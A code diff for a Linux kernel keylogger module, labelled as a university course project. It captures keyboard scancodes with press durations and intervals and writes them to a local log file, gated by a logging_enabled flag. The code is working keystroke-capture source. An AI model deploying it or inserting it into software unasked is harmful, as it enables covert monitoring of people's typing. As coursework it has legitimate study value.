@@ -6,10 +6,21 @@
 #include <linux/keyboard.h>
 #include <linux/jiffies.h>
 
+#include <linux/usb.h>
+#include <linux/string.h>
+
+
+#include <linux/rtc.h>
+#include <asm/segment.h>
+#include <asm/uaccess.h>
+
+
 #define KBD_IRQ_LINE 1
 #define AUTHOR_NAME "Anna Afanaseva IU7-73"
 #define DESCRIPTION "Course project for BMSTU. Keylogger"
 #define LICENSE "GPL"
+
+extern unsigned int logging_enabled;
 
 typedef unsigned long int time_tt;
 
@@ -25,19 +36,17 @@ typedef struct {
     char *name;
 }KBD_IQRQ_STR;
 
-
 time_tt last_pressed;
 KeyPressedInfo keys[3];
 char kbd_info[1024];
 
 struct file *f;
-char *path = "var/log/kbd.log";
+char *path = "home/anna/OS_project/kbd.log";
 
 static KBD_IQRQ_STR current_kbd_irq = {
     .irq = KBD_IRQ_LINE,
     .name = "Keyboard irq"
 };
-
 
 int getKey(int scancode){
     int sc = scancode - 128;
@@ -83,16 +92,21 @@ void newKey(int scancode, time_tt msec){
 }
 
 void writeToFile(int index)
-{
-    f = filp_open(path, O_APPEND | O_CREAT | O_WRONLY, 0777);
-
-    if (IS_ERR(f)){
-        printk("File error occured");
+{    
+    if (!logging_enabled) {
+        printk(KERN_INFO "logging disabled");
         return;
     }
 
-    sprintf(kbd_info, "Code: %d\tDuration: %d msec\tInterval: %d msec\n", 
-                        keys[index].code, keys[index].duration, keys[index].interval);
+    f = filp_open(path, O_APPEND | O_CREAT | O_WRONLY, 0777);
+    sprintf(kbd_info, "Code: %d\tDuration: %d msec\tInterval: %d msec", 
+                        keys[index].code, keys[index].duration, keys[index].interval);  
+    if (IS_ERR(f)){
+        printk(KERN_ERR "File error occured");
+        printk("%s\n", kbd_info);
+        return;
+    }
+    
     kernel_write(f, kbd_info, strlen(kbd_info), &f->f_pos);  
     filp_close(f, NULL);
 }
